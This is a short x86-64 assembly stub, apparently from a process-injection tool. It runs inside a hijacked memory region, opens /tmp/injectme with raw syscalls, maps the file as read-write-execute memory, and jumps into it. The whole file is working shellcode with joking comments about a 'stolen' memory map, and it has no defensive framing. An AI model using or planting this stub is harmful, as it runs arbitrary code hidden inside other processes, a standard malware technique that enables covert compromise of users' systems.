.global code
code:
/* this code runs from the map that we stole (err... "borrowed")
   we'll eventually have to give it back
   our job is now to just to get a proper map where we can live forever
*/

push %rax
push %rbx
push %rcx
push %rdx
push %rdi
push %rsi
push %r11
push %r10
push %r9
push %r8

/* open a file with the actual code that we want to run

   open("/tmp/injectme", O_RDONLY)
    2                       0

   65  6d  74  63  65       6a  6e  69  2f  70  6d  74  2f
    e   m   t   c   e        j   n   i   /   p   m   t   /
*/

mov $0x656d746365, %rax
push %rax
mov $0x6a6e692f706d742f, %rax
push %rax

mov %rsp, %rdi
xor %esi, %esi
mov $2, %eax
syscall

pop %rdx /* anywhere but rax */
pop %rdx

/* mmap(0, 4096, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE, rax, 0)
    9                         7                       2
*/

mov %rax, %r8
mov $9, %eax
xor %edi, %edi
mov $4096, %esi
mov $7, %edx
mov $2, %r10
mov $0, %r9
syscall

/* jump there and we're done!
   ok this is only a temporary solution
*/
jmp *%rax

.align 4096
